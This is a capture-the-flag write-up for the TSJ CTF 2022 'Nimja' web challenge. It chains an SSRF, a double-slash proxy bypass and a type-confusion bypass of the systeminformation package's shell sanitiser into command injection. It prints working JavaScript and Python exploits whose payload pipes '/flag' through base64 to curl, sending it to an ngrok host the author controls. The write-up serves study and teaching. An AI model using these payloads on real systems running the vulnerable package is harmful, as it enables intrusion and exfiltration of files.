# TSJ CTF 2022 write-up - Nimja at Nantou

![Banner](https://i.imgur.com/RO4lpJK.jpg)

This was the first edition of TSJ CTF and it was great!
There was a lot of hardcore Web Challenges, with 1 or 3 solves.
I did some progress in other web challenges, but solved only Nimja. 

Some hackers from our team broke 2 other pwns and we managed to get 22nd place among 82 teams, who made more than 110 points (Sanity + Questionnaire).

![Nimja](https://i.imgur.com/3N2CWme.png)

We got 3 Docker containers:
1. **proxy**: An [Apache Traffic Server](https://trafficserver.apache.org/) routing requests to the other services [2] and [3] - the only one directly acessible.
2. **hello-from-the-world**: A [Nim Language](https://nim-lang.org/) webapp that holds a key to get service information from [3].
4. **service-info**: A nodejs app the gives OS Service Information using the [systeminformation](https://www.npmjs.com/package/systeminformation) npm package.

![Diagram](https://i.imgur.com/a9k5a8A.png)

We also get a docker-compose file to easily start the challenge locally.

![docker-compose](https://i.imgur.com/Yed8D69.png)

## Architecture

I think expanding the diagram will make it easier to understand the scenario.

![Expanded Diagram](https://i.imgur.com/zoPY8oa.png)

### Summary
* Flag is in service-info (/flag file)
* There is no request using the flag - it is not even referenced in the [app.js](https://github.com/Neptunians/tsj-2022-writeups/blob/main/distfiles/service-info/app.js) file.
* keyfile is acessible inside hello-from-the-world (/key), but blocked by the proxy (route to /forbidden first)
* /admin is the only useful option in service-info, but blocked by the proxy (route to /forbidden first)
* We need to get the key from hello-from-the-world/key, to be able to call service-info/admin
* We have to find a way to get the flag from service-info/admin

## hello-from-the-world (nim language)

First of all, we need to recover the key. Let's take a look at the source - [app.nim](https://github.com/Neptunians/tsj-2022-writeups/blob/main/distfiles/hello-from-the-world/app.nim).

```nim
import jester
import std/jsonutils
import std/[httpclient, json]

proc hello_from_the_world(host: string): string =
  var client = newHTTPClient(timeout=1000)
  var uri = host & "hello"
  var response = ""
  try:
    response = client.getContent(uri)
  except:
    response = "Cannot fetch hello from your designated host.\n"
  return response

proc getkey(): string =
  try:
    let key = readFile("/keyfile")
    return key
  except IOError:
    return "Cannot open keyfile!\n"
  
router myrouter:
  get "/":
    var jsonheader = parseJson($request.headers.toJson)
    var ip = $request.ip

    # If x-forwarded-for exists
    if haskey(jsonheader["table"], "x-forwarded-for"):
      var ips = jsonheader["table"]["x-forwarded-for"]
      ip = ips[ips.len-1].str
    
    if ip == "127.0.0.1":
      resp getkey()
    else:
      resp "This is the index page.\nOnly local user can get the key.\n"
  get "/hello":
    resp "Hello from myself\n"
  get "/forbidden":
    resp "Only local user can access it.\n"
  get "/key":
    resp getkey()
  post "/get_hello":
    var jsonheader = parseJson($request.params.toJson)
    var host = ""
    if haskey(jsonheader, "host"):
      host = jsonheader["host"].str

    if host != "":
      var response = hello_from_the_world(host)
      resp response
    else:
      resp "Please provide the host so that they can say hello to you.\n"

proc main() =
  let port = Port(80)
  let settings = newSettings(port=port)
  var jester = initJester(myrouter, settings=settings)
  jester.serve()

when isMainModule:
  main()
```

### Weakness

When I first woke up, [Infektion](https://fireshellsecurity.team/infektion/) had already got the key, using the SSRF on /get_hello to bypass the proxy protection:

```python
import requests

data = { "host": "http://localhost/?" }

r = requests.post("http://34.81.54.62:5487/hello-from-the-world/get_hello", data=data)

print(r.text)
```

Key:
```serviceinformation
T$J_CTF_15_FUN_>_<_bY_Th3_wAy_IT_is_tHE_KEEEEEEEY_n0t_THE_flag
```

Step one - done!

## service-info (nodejs)

Let's first lake a look at the code:

```javascript
const http = require('http')
const si = require('systeminformation')
const fs = require('fs')

function readkey() {
    try {
        const key = fs.readFileSync('/keyfile', 'utf8');
        return key
    } catch (err) {
        console.error(err);
    }
}

function get_services(service) {
    return new Promise((res, reject) => {
        si.services(service)
        .then(data => {
            console.log(data);
            if (data != null) res(data.toString());
            else res("Failed");
        }).catch(error => {
            console.error("Error: " + error);
            reject("There is an error when fetching services.");
        })
    });
}

const KEY = readkey();

http.createServer((request, response) => {
    let body = [];
    request.on('error', (err) => {
        response.end("Error while parsing request: " + err)
    }).on('data', (chunk) => {
        if(request.method == "POST") body.push(chunk);
    }).on('end', async () => {
        response.on('error', (err) => {
            response.end("Error while sending response: " + err)
        });
        
        if (request.url == "/admin") {
            if (request.method == "POST") {
                if(body) {
                    try {
                        var jsonData = JSON.parse(body);
                        var service = jsonData.service;
                        var client_key = jsonData.key;
                    } catch (e) {
                        response.end("ERROR");
                        return 1;
                    }
                }
                
                if (client_key == KEY) {
                    let return_data = await get_services(service);
                    response.end(return_data);
                } else {
                    console.log("Key does not match.\n");
                    response.end("Only local users with the key can access the function.\n");
                }
            }
            else {
                response.end("This is the admin page.\n");
            }
        } else if (request.url == "/forbidden") {
            response.end("Only local user can access it.\n");
        } else if (request.url == "/") {
            response.end("This is the index page.\n");
        } else {
            response.end("404 Not Found\n");
        }
    });
}).listen(5000);
```

This is mostly a very simple code.
The only visible path here is to attack the [systeminformation](https://www.npmjs.com/package/systeminformation) package.

But to get there, we have to call **/admin**.

### Getting into /admin

To get into the next step, we must be able to send posts to /admin, which is also blocked by the proxy. 

We already got a SSRF with hello-from-the-world/get_hello, but it only helps us on GET requests.

Since the POST to /admin is the handler we need to reach, we can't use the same technique.

Luckily, this bypass was already done last year on [Cyber Apocalypse 2021 - Cessation](https://ctftime.org/writeup/27726).

Let's test a normal scenario, using the GET /admin to test.

```
$ curl http://172.23.0.2:8080/service-info/admin
Only local user can access it.
```

Let's test the bypass, by using double slash "//":

```
$ curl http://172.23.0.2:8080/service-info//admin
This is the admin page.
```

Gotcha!!

The admin page message means we successfully bypassed the Traffic Server remap configuration with this simple and lovely trick, also available for the POST request.

### Analyzing serviceinformation

This was my first adventure on analyzing real-world source code for unknown vulnerabilities, and it was really fun!

It's important to observe that we're dealing with an older version of the package - 5.2.6:

https://github.com/sebhildebrandt/systeminformation/tree/v5.2.6

This package returns service information from the os (name, state, ...).

This is the called function:

```python
let return_data = await get_services(service);
```

So let's take a look at that function version:

https://github.com/sebhildebrandt/systeminformation/blob/v5.2.6/lib/processes.js#L92

I first investigated resolved issues and got directly to the part of the code that hurts the eye:

```javascript
function services(srv, callback) {
    // Lots of lines...
    
    let comm = (_darwin) ? 'ps -caxo pcpu,pmem,pid,command' : 'ps -axo pcpu,pmem,pid,command';
    if (srvString !== '' && srvs.length > 0) {
    exec(comm + ' | grep -v grep | grep -iE "' + srvString + '"', { maxBuffer: 1024 * 20000 }, function (error, stdout) {
        
    // Lots of lines...
```

After confirming this code-block is called by the function in our platform (linux) we got to the conclusion that we have a viable command injection if we can control the srvString value.

But we soon find that the input is filtered:

```javascript
function services(srv, callback) {
    // Lots of lines...
    const s = util.sanitizeShellString(srv);
    for (let i = 0; i <= 2000; i++) {
      if (!(s[i] === undefined)) {
        srvString = srvString + s[i];
      }
    }     
    // Lots of lines...
```

Dead end?

### Hack the filter

That filtering leads us to the sanitization function, which is on a different file:

https://github.com/sebhildebrandt/systeminformation/blob/d7f934388c8225c9c291a938259ce2e5cac883d3/lib/util.js#L505

```javascript
function sanitizeShellString(str, strict = false) {
  const s = str || '';
  let result = '';
  for (let i = 0; i <= 2000; i++) {
    if (!(s[i] === undefined ||
      s[i] === '>' ||
      s[i] === '<' ||
      s[i] === '*' ||
      s[i] === '?' ||
      s[i] === '[' ||
      s[i] === ']' ||
      s[i] === '|' ||
      s[i] === '˚' ||
      s[i] === '$' ||
      s[i] === ';' ||
      s[i] === '&' ||
      s[i] === '(' ||
      s[i] === ')' ||
      s[i] === ']' ||
      s[i] === '#' ||
      s[i] === '\\' ||
      s[i] === '\t' ||
      s[i] === '\n' ||
      s[i] === '\'' ||
      s[i] === '`' ||
      s[i] === '"' ||
      strict && s[i] === ' ' ||
      strict && s[i] == '{' ||
      strict && s[i] == ')')) {
      result = result + s[i];
    }
  }
  return result;
}
```

It goes through each char and test for a lot of known dangerous symbols for bash command injection, like "|" (pipe) and "$" (dollar).

At first, I thought it was filtering only the first 2k chars and lost some time trying a bigger payload (dumb me).

![Confused](https://i.imgur.com/Ah0DiAW.png)

I couldn't find a bypass for any string, but after analyze the entire call sequence, I saw NO TYPE VALIDATION FOR STRING.
So we can play with Type Confusion.

In an array, it will test each element, assuming it is a char. If the element is another array, the comparsion will fail and the char will not be filtered. I also noticed that it just converts everything to string at the end.

I also changed the service function to generate debugging output (the print to console old way of our ancestors).

Let's put it all together in a testcase, outside of the app.

```javascript
const si = require('systeminformation');

function get_services(service) {
    return new Promise((res, reject) => {
        si.services(service)
        .then(data => {
            console.log(data);
            if (data != null) res(data.toString());
            else res("Failed");
        }).catch(error => {
            console.error("Error: " + error);
            reject("There is an error when fetching services.");
        })
    });
}

service = ['a', 'b', 'c', ['"'], 'd'];

get_services(service).then((return_data) => {
    console.log(return_data);    
})
```

Enough theory, let's try it:

```
$ node testcase.js 

SANITIZED:
abc"d

FINAL COMMAND:
ps -axo pcpu,pmem,pid,command | grep -v grep | grep -iE "abc"d"

[ { name: 'abc"d', running: false, startmode: '', cpu: 0, mem: 0 } ]

[object Object]
```

And we got something!
The string after sanitization got our double quotes. The final "ps" command sent to bash is broken. 
Let's change the testcase to exploit the command injection and send the flag to an endpoint we control:

```javascript
const si = require('systeminformation');

function get_services(service) {
    return new Promise((res, reject) => {
        si.services(service)
        .then(data => {
            console.log(data);
            if (data != null) res(data.toString());
            else res("Failed");
        }).catch(error => {
            console.error("Error: " + error);
            reject("There is an error when fetching services.");
        })
    });
}

// Changes a string into the poisoned array, to bypass the filter
function strToPoisonArray(s) {
    result = [];

    dangerZone = '"|><\\()`;';

    for (i = 0; i < s.length; i++) {

        if (dangerZone.indexOf(s[i]) !== -1) {
            result.push([s[i]]);
        } else {
            result.push(s[i]);
        }
    }

    return result;
}

// Convert flag to base64 and send in the URL
payload = 'abc" | curl http://a241-2804-14d-5cd0-9ee8-d8a2-ca3d-daa0-d4b1.ngrok.io/flag/`cat /flag | base64` | echo "';

service = strToPoisonArray(payload);

get_services(service).then((return_data) => {
    console.log(return_data);    
})
```

Something pops on the ngrok:

![ngrok test case](https://i.imgur.com/2INEWPv.png)

And decoding the base64:

```
$ echo ZmxhZ3tmYWtlfQo= | base64 -d
flag{fake}
```

We proved the command injection on systeminformation 5.2.6.

P.S.: The next version was already patched for this bug. The team perceived the vulnerability and solved it proactively. No specific  issue was registered.

### RCE for the Win

Now we got all the pieces we need.
Since I'm dumb (as already proved above), I translated the testcase to python:

```python
import requests
import json

# Remote
target = 'http://34.81.54.62:5487'

# Local
target = 'http://172.23.0.2:8080'

# My ngrok
controlled_endpoint = 'http://a241-2804-14d-5cd0-9ee8-d8a2-ca3d-daa0-d4b1.ngrok.io'

session = requests.Session()

# list comprehension is just beautiful
def strToPoisonArray(s):
    dangerZone = '"|><\\()`'
    return [ [x] if x in dangerZone else x for x in s ]

payload = f'abc" | curl {controlled_endpoint}/fireflag/`cat /flag | base64` | echo "'
service = strToPoisonArray(payload)

print(service)

# Get Key
response = session.get(f'{target}/hello-from-the-world//key')

key = response.text

print(response.status_code)
print(f'Key: {key}')

# Send /admin Payload
params = json.dumps({'key': key, 'service': service})

# Do not forget the double slash
response = session.post(f'{target}/service-info//admin', data=params)

print(response.status_code)
print(response.text)
```

```
$ python exploit.py 
['a', 'b', 'c', ['"'], ' ', ['|'], ' ', 'c', 'u', 'r', 'l', ' ', 'h', 't', 't', 'p', ':', '/', '/', 'a', '2', '4', '1', '-', '2', '8', '0', '4', '-', '1', '4', 'd', '-', '5', 'c', 'd', '0', '-', '9', 'e', 'e', '8', '-', 'd', '8', 'a', '2', '-', 'c', 'a', '3', 'd', '-', 'd', 'a', 'a', '0', '-', 'd', '4', 'b', '1', '.', 'n', 'g', 'r', 'o', 'k', '.', 'i', 'o', '/', 'f', 'i', 'r', 'e', 'f', 'l', 'a', 'g', '/', ['`'], 'c', 'a', 't', ' ', '/', 'f', 'l', 'a', 'g', ' ', ['|'], ' ', 'b', 'a', 's', 'e', '6', '4', ['`'], ' ', ['|'], ' ', 'e', 'c', 'h', 'o', ' ', ['"']]
200
Key: REDACTED

200
[object Object],[object Object],[object Object],[object Object]
```

Let's check the mailbox:

![Flagged](https://i.imgur.com/mBNrVdc.png)

We already know this base64: 
```
$ echo ZmxhZ3tmYWtlfQo= | base64 -d
flag{fake}
```

And in the actual event:

```
TSJ{HR5_1S_C001_XD_L3ts_gooooo}
```

## References
* [CTF Time Event](https://ctftime.org/event/1547)
* [TSJ CTF](https://chal.ctf.tsj.tw/)
* [TSJ CTF Discord](https://discord.gg/u6taYEWGfr)
* [Github repo with the artifacts discussed here](https://github.com/Neptunians/tsj-2022-writeups)
* [Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
* [OS command injection](https://portswigger.net/web-security/os-command-injection)
* [JavaScript type confusion](https://snyk.io/blog/remediate-javascript-type-confusion-bypassed-input-validation/)
* [Cyber Apocalypse 2021 - Cessation](https://ctftime.org/writeup/27726)
* [Apache Traffic Server](https://trafficserver.apache.org/)
* [Nim Language](https://nim-lang.org/)
* [systeminformation](https://www.npmjs.com/package/systeminformation)
* [ngrok](https://ngrok.com/)
* Team: [FireShell](https://fireshellsecurity.team/)
* Team Twitter: [@fireshellst](https://twitter.com/fireshellst)
* Follow me too :) [@NeptunianHacks](https://twitter.com/NeptunianHacks) 